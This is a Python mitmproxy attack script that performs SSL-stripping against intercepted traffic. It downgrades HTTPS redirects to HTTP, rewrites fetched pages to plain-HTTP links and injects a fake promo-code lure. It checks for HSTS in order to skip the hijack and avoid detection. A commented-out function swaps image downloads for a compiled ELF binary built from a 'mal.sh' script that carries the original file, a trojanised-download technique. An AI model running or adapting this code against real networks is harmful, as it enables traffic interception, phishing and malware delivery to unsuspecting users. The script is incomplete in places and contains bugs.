from mitmproxy import http
from mitmproxy import tls
from mitmproxy import ctx
import requests
import re
import subprocess
import base64

HEADER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0"


def response(flow: http.HTTPFlow):
    # check if initial request doesn't establish tls
    if not flow.client_conn.tls_established:
        if "image/jpeg" in flow.response.headers.get("Content-Type", ""):
            ctx.log.info("DEBUG: Content-Type: image/jpeg detected")
            #inject_payload(flow)
        # check if redirect to other website includes a https link
        elif flow.response.status_code in (301, 308) and "https://" in flow.response.headers.get("Location", ""):
            http_downgrade(flow)


def tls_clienthello(data: tls.ClientHelloData):
    # TODO: find way to not trigger SSL hijack on browser
    ctx.log.info(data.client_hello.sni)
    if not uses_hsts(data.client_hello.sni):
        http_downgrade(data.client_hello.sni)
    else:
        # lets mitmproxy NOT overwrite its own certificate
        # important for passive sniffing
        data.ignore_connection = True


def http_downgrade(flow):
    if type(flow) is http.HTTPFlow:
        # extract https redirect link
        https_link = flow.response.headers.get("Location", "")
        # include original headers from targets browser and receive source code of https website
        ctx.log.info(f"location header: {https_link}")
        ctx.log.info(f"request headers: {flow.request.headers}")

        destination_html = requests.get(https_link)
        fake_html = destination_html.text.replace("https://", "http://")

        # modify html
        modified = fake_html.replace("</html>", "<h1 href='google.com'>get free promo code!</html>")

        # send modified html in http
        # IMPORTANT: mitmproxy v12 has Response instead of HTTPResponse
        flow.response = http.Response.make(
                200,
                modified,
                {"Content-Type": "text/html"}
            )
#    elif type(flow) is str:
        # TODO:


def uses_hsts(domain):
    try:
        response = requests.get(f"https://{domain}", timeout=2)
        return "strict-transport-security" in response.headers
    except requests.RequestException:
        return False


"""
def inject_payload(flow: http.HTTPFlow):
    with open("mal.sh", "r+") as f:
        script = f.read()

        # encode to base64 for valid bash script value
        encoded_original_file = base64.b64encode(flow.response.content).decode()

        # inject binary of original file into script
        # this will set variable "ORIGINAL" from bash script to original file binaries
        new_script = re.sub(
                r'^(ORIGINAL_FILE=)(["\']?).*?\2\s*$',
                f'ORIGINAL_FILE="{encoded_original_file}"',
                script,
                flags=re.MULTILINE,
                count=1
                )
        f.seek(0)
        f.write(new_script)
        f.truncate()

    # compile script to elf
    subprocess.run(["shc", "-f", "mal.sh"], check=True)

    # open in rb to extract raw binaries
    with open("output.x", "rb") as f:
        elf_bin = f.read()
        # extract header containing original filename
        disposition = flow.response.headers.get("Content-Disposition", "")
        # extract original filename from header
        original_filename = re.search(
                r'filename\*?=(?:UTF-8\'\')?"?([^\";\r\n]+)"?',
                disposition)

        flow.response = http.HTTPResponse.make(
            200,
            elf_bin,
            {
                "Content-Type": "image/jpeg",
                "Content-Disposition": f'attachment; filename={original_filename})',
                "Content-Length": str(len(elf_bin))
                }
        )
"""
